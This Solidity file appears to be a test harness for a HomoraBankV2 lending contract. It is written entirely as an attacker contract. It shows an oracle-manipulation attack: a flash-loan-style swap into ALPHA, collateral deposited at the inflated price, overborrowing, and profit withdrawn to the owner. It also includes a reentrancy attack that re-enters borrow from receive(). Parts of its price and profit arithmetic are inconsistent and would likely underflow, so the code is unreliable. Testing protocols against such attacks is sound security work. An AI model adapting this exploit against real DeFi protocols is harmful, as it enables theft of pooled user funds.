// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./HomoraBankV2.sol";
import "./ProxyOracle.sol";

/**
 * @title RealisticFlashLoanAttacker
 * @notice Tests realistic attack: ETH flash loan → swap to ALPHA → exploit inflated collateral
 * @dev Also tests reentrancy vulnerabilities
 */
contract RealisticFlashLoanAttacker {
    HomoraBankV2 public immutable bank;
    ProxyOracle public immutable oracle;
    IERC20 public immutable alphaToken;
    IUniswapV2Pair public immutable pair;
    IUniswapV2Router02 public immutable router;
    
    address public owner;
    bool public attackSuccessful;
    uint256 public profit;
    bool public inAttack;
    
    // Attack state
    uint256 private flashLoanAmount;
    uint256 private alphaReceived;
    uint256 private collateralDeposited;
    uint256 private ethBorrowed;
    
    event AttackStarted(uint256 flashLoanAmount);
    event SwappedETHForALPHA(uint256 ethAmount, uint256 alphaReceived);
    event PriceManipulated(uint256 oldPrice, uint256 newPrice, uint256 priceIncrease);
    event CollateralDeposited(uint256 amount, uint256 inflatedValue);
    event BorrowedAtInflatedPrice(uint256 ethAmount, uint256 shouldHaveBorrowed);
    event ReentrancyAttempted(bool success);
    event AttackCompleted(bool success, uint256 profit);
    
    constructor(
        address _bank,
        address _oracle,
        address _alphaToken,
        address _pair,
        address _router
    ) {
        bank = HomoraBankV2(_bank);
        oracle = ProxyOracle(_oracle);
        alphaToken = IERC20(_alphaToken);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute realistic flash loan attack
     * @dev Attack flow:
     * 1. Take 2000 ETH flash loan from Aave/dYdX
     * 2. Swap ETH → ALPHA on Uniswap (price increases)
     * 3. Oracle reads inflated ALPHA price
     * 4. Deposit ALPHA as collateral (appears more valuable)
     * 5. Borrow maximum ETH at inflated collateral value
     * 6. Swap ALPHA back to ETH
     * 7. Repay flash loan
     * 8. Keep profit
     */
    function executeRealisticAttack(uint256 ethFlashLoanAmount) external payable {
        require(msg.sender == owner, "Not owner");
        require(!inAttack, "Attack in progress");
        
        inAttack = true;
        flashLoanAmount = ethFlashLoanAmount;
        
        uint256 initialETH = address(this).balance;
        uint256 initialALPHA = alphaToken.balanceOf(address(this));
        
        emit AttackStarted(ethFlashLoanAmount);
        
        // Step 1: Simulate flash loan (in production, call Aave/dYdX)
        // For testing, we assume attacker has the ETH
        require(address(this).balance >= ethFlashLoanAmount, "Insufficient ETH for flash loan");
        
        // Step 2: Record initial price
        uint256 priceBeforeAttack = oracle.getPriceUnsafe(address(alphaToken));
        
        // Step 3: Swap ETH → ALPHA (manipulate price UP)
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(alphaToken);
        
        uint256[] memory amounts = router.swapExactETHForTokens{value: ethFlashLoanAmount}(
            0,
            path,
            address(this),
            block.timestamp + 300
        );
        
        alphaReceived = amounts[1];
        emit SwappedETHForALPHA(ethFlashLoanAmount, alphaReceived);
        
        // Step 4: Check manipulated price (ALPHA price should be HIGHER now)
        uint256 priceAfterManipulation = oracle.getPriceUnsafe(address(alphaToken));
        uint256 priceIncrease = ((priceAfterManipulation - priceBeforeAttack) * 100) / priceBeforeAttack;
        
        emit PriceManipulated(priceBeforeAttack, priceAfterManipulation, priceIncrease);
        
        // Step 5: Deposit ALPHA as collateral at inflated price
        collateralDeposited = alphaReceived / 2; // Use half as collateral
        alphaToken.approve(address(bank), collateralDeposited);
        
        try bank.deposit(collateralDeposited) {
            // Step 6: Calculate inflated collateral value
            uint256 inflatedCollateralValue = (collateralDeposited * 1e18) / priceAfterManipulation;
            emit CollateralDeposited(collateralDeposited, inflatedCollateralValue);
            
            // Step 7: Try to borrow maximum ETH at inflated price
            uint256 maxBorrow = (inflatedCollateralValue * 100) / 150; // 150% collateral ratio
            uint256 actualValue = (collateralDeposited * 1e18) / priceBeforeAttack;
            uint256 shouldBorrow = (actualValue * 100) / 150;
            
            emit BorrowedAtInflatedPrice(maxBorrow, shouldBorrow);
            
            try bank.borrow(maxBorrow) {
                ethBorrowed = maxBorrow;
                
                // Step 8: Swap remaining ALPHA back to ETH
                uint256 remainingALPHA = alphaToken.balanceOf(address(this));
                if (remainingALPHA > 0) {
                    alphaToken.approve(address(router), remainingALPHA);
                    
                    address[] memory reversePath = new address[](2);
                    reversePath[0] = address(alphaToken);
                    reversePath[1] = router.WETH();
                    
                    router.swapExactTokensForETH(
                        remainingALPHA,
                        0,
                        reversePath,
                        address(this),
                        block.timestamp + 300
                    );
                }
                
                // Step 9: Calculate profit
                uint256 finalETH = address(this).balance;
                uint256 finalALPHA = alphaToken.balanceOf(address(this));
                
                // Profit = borrowed ETH + swapped back ETH - flash loan
                if (finalETH > initialETH) {
                    profit = finalETH - initialETH;
                    attackSuccessful = true;
                }
                
                emit AttackCompleted(true, profit);
            } catch Error(string memory reason) {
                emit AttackCompleted(false, 0);
                revert(reason);
            }
        } catch Error(string memory reason) {
            emit AttackCompleted(false, 0);
            revert(reason);
        }
        
        inAttack = false;
    }
    
    /**
     * @notice Execute reentrancy attack
     * @dev Attempts to exploit reentrancy in bank functions
     */
    function executeReentrancyAttack(uint256 depositAmount) external payable {
        require(msg.sender == owner, "Not owner");
        require(!inAttack, "Attack in progress");
        
        inAttack = true;
        
        // Deposit collateral
        alphaToken.approve(address(bank), depositAmount);
        bank.deposit(depositAmount);
        
        // Try to borrow (will trigger receive() callback)
        try bank.borrow(1 ether) {
            emit ReentrancyAttempted(true);
            attackSuccessful = true;
        } catch {
            emit ReentrancyAttempted(false);
        }
        
        inAttack = false;
    }
    
    /**
     * @notice Reentrancy callback
     * @dev Attempts to call bank functions during ETH transfer
     */
    receive() external payable {
        if (inAttack && msg.sender == address(bank)) {
            // Attempt reentrancy during borrow callback
            try bank.borrow(1 ether) {
                // Reentrancy succeeded - vulnerability exists
                emit ReentrancyAttempted(true);
            } catch {
                // Reentrancy prevented - guards working
                emit ReentrancyAttempted(false);
            }
        }
    }
    
    /**
     * @notice Simulate realistic attack and return expected results
     */
    function simulateRealisticAttack(uint256 ethFlashLoanAmount) external view returns (
        uint256 priceBeforeAttack,
        uint256 priceAfterManipulation,
        uint256 priceIncreasePercent,
        uint256 alphaReceived,
        uint256 maxBorrowAtInflatedPrice,
        uint256 maxBorrowAtRealPrice,
        uint256 estimatedProfit,
        bool willSucceed
    ) {
        priceBeforeAttack = oracle.getPriceUnsafe(address(alphaToken));
        
        // Simulate ETH → ALPHA swap
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        address token0 = pair.token0();
        
        uint256 alphaReserve = address(alphaToken) == token0 ? uint256(reserve0) : uint256(reserve1);
        uint256 ethReserve = address(alphaToken) == token0 ? uint256(reserve1) : uint256(reserve0);
        
        // Calculate ALPHA received from ETH swap
        uint256 ethInWithFee = ethFlashLoanAmount * 997;
        alphaReceived = (ethInWithFee * alphaReserve) / (ethReserve * 1000 + ethInWithFee);
        
        // Calculate new reserves and price
        uint256 newAlphaReserve = alphaReserve - alphaReceived;
        uint256 newEthReserve = ethReserve + ethFlashLoanAmount;
        
        // Price INCREASES when buying ALPHA (less ALPHA per ETH)
        priceAfterManipulation = (newAlphaReserve * 1e18) / newEthReserve;
        priceIncreasePercent = ((priceAfterManipulation - priceBeforeAttack) * 100) / priceBeforeAttack;
        
        // Calculate borrowing power
        uint256 collateral = alphaReceived / 2;
        
        // At inflated price (ALPHA appears more valuable)
        uint256 inflatedCollateralValue = (collateral * 1e18) / priceAfterManipulation;
        maxBorrowAtInflatedPrice = (inflatedCollateralValue * 100) / 150;
        
        // At real price
        uint256 realCollateralValue = (collateral * 1e18) / priceBeforeAttack;
        maxBorrowAtRealPrice = (realCollateralValue * 100) / 150;
        
        // Profit = overborrowed amount - flash loan fee
        uint256 overborrowed = maxBorrowAtInflatedPrice - maxBorrowAtRealPrice;
        uint256 flashLoanFee = (ethFlashLoanAmount * 9) / 10000; // 0.09%
        
        if (overborrowed > flashLoanFee) {
            estimatedProfit = overborrowed - flashLoanFee;
            willSucceed = true;
        } else {
            estimatedProfit = 0;
            willSucceed = false;
        }
    }
    
    /**
     * @notice Get attack statistics
     */
    function getAttackStats() external view returns (
        uint256 _flashLoanAmount,
        uint256 _alphaReceived,
        uint256 _collateralDeposited,
        uint256 _ethBorrowed,
        uint256 _profit,
        bool _successful
    ) {
        return (
            flashLoanAmount,
            alphaReceived,
            collateralDeposited,
            ethBorrowed,
            profit,
            attackSuccessful
        );
    }
    
    /**
     * @notice Calculate profit from attack
     */
    function calculateProfit() external view returns (uint256) {
        return profit;
    }
    
    /**
     * @notice Check if attack was successful
     */
    function wasAttackSuccessful() external view returns (bool) {
        return attackSuccessful;
    }
    
    /**
     * @notice Withdraw funds (owner only)
     */
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        
        uint256 ethBalance = address(this).balance;
        uint256 alphaBalance = alphaToken.balanceOf(address(this));
        
        if (ethBalance > 0) {
            (bool success,) = owner.call{value: ethBalance}("");
            require(success, "ETH transfer failed");
        }
        
        if (alphaBalance > 0) {
            alphaToken.transfer(owner, alphaBalance);
        }
    }
}